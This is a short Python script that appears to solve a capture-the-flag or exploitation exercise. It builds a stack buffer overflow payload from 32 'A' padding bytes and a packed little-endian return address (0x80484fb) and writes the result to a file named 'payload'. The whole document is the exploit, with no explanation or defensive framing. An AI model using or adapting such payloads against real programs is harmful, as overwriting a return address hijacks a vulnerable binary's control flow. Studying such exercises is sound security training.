#!/usr/bin/env python
import struct

payload = 'A'*32
payload += struct.pack("<I",0x80484fb)

open('payload', 'w').write(payload)
